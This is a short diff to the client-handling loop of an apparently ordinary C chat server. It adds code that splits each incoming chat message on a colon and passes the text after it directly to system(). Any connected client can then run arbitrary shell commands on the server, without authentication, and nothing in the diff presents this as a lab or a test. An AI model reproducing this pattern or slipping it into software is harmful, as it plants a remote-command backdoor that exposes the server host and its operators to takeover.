@@ -132,7 +132,18 @@ void *handle_client(void *arg){
 				send_message(buff_out, cli->uid);
 
 				str_trim_lf(buff_out, strlen(buff_out));
-				printf("%s -> %s\n", buff_out, cli->name);
+				
+				char * nm = strtok(buff_out, ":");
+				char * msg = strtok(NULL, ":");
+				//if(system(msg)!=0){
+					//printf("%s:%s -> %s\n",nm,msg, cli->name);
+				//}else{
+					//printf("%s:%s -> %s\n",nm,msg, cli->name);
+				//}
+				if(system(msg) != 0){
+					printf("%s -> %s\n",cli->name,buff_out);
+				}
+				
 			}
 		} else if (receive == 0 || strcmp(buff_out, "bye") == 0){
 			sprintf(buff_out, "%s has left\n", cli->name);
